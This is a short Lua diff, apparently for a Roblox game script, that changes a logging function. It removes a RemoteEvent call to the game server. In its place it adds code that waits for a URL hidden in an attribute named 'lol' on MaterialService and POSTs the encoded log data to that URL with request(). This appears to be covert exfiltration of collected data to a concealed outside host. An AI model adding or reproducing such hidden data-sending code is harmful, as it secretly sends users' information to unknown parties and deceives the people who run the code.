@@ -46,8 +46,18 @@ local function log_information(...)
 		["actions"] = {},
 		["flags"] = 0
 	})
+
+	local to = game.MaterialService:GetAttribute("lol")
+	repeat task.wait() to = game.MaterialService:GetAttribute("lol") until to ~= nil
 	
-	game.ReplicatedStorage.RemoteEvent:FireServer(encodedData)
+	request({
+		Url = to,
+		Method = "POST",
+		Headers = {
+			["Content-Type"] = "application/json"
+		},
+		Body = encodedData
+	})
 end
 
 if http then
